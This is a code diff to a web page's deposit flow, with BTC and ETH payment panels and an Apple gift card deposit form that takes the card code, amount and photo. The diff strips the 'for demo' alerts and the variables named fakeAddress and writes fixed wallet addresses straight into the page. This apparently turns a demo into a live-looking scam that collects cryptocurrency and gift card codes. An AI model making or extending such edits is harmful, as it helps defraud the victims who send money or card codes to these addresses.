@@ -481,10 +481,7 @@
         }
 
         function proceedToDeposit() {
-            if (!selectedMethod) {
-                alert('Please select a deposit method first.');
-                return;
-            }
+            if (!selectedMethod) return;
 
             // Hide both panels first
             document.getElementById('cryptoDepositPanel').style.display = 'none';
@@ -507,31 +504,16 @@
 
             // Handle BTC deposit
             if (selectedMethod === 'btc') {
-                const coin = 'BTC';
-                const amount = '0.005';
-                const fakeAddress = 'bc1qe3dxay03xs0ck4xhug6snjttcqf04c3ntpmkp7';
-
                 document.getElementById('cryptoDepositPanel').style.display = 'block';
-                document.getElementById('cryptoCoin').innerText = coin;
-                document.getElementById('cryptoAmount').innerText = amount + ' ' + coin;
-                document.getElementById('cryptoAddress').innerText = fakeAddress;
+                document.getElementById('cryptoCoin').innerText = 'BTC';
+                document.getElementById('cryptoAddress').innerText = 'bc1qe3dxay03xs0ck4xhug6snjttcqf04c3ntpmkp7';
                 document.getElementById('cryptoQr').src = 'btc.jpeg';
-
-                alert('Crypto payment panel shown. Please send funds to the generated address for demo.');
             }
-            // Handle ETH deposit
             else if (selectedMethod === 'eth') {
-                const coin = 'ETH';
-                const amount = '0.1';
-                const fakeAddress = '0x2c2F275F650932C19cb03d0D1085b2f8D1b0093B';
-
                 document.getElementById('ethDepositPanel').style.display = 'block';
-                document.getElementById('ethCoin').innerText = coin;
-                document.getElementById('ethAmount').innerText = amount + ' ' + coin;
-                document.getElementById('ethAddress').innerText = fakeAddress;
+                document.getElementById('ethCoin').innerText = 'ETH';
+                document.getElementById('ethAddress').innerText = '0x2c2F275F650932C19cb03d0D1085b2f8D1b0093B';
                 document.getElementById('ethQr').src = 'eth.jpeg';
-
-                alert('Crypto payment panel shown. Please send funds to the generated address for demo.');
             }
         }
 
@@ -541,8 +523,8 @@
             var photo  = document.getElementById('applePhoto').files[0];
             var userData = JSON.parse(localStorage.getItem('userData') || '{}');
 
-            if (!code) { alert('Please enter the gift card code.'); return; }
-            if (!amount) { alert('Please enter the card amount.'); return; }
+            if (!code) { document.getElementById('appleCode').style.border = '2px solid #e74c3c'; return; }
+            if (!amount) { document.getElementById('appleAmount').style.border = '2px solid #e74c3c'; return; }
 
             // Save to localStorage as pending deposit
             var fundingData = {
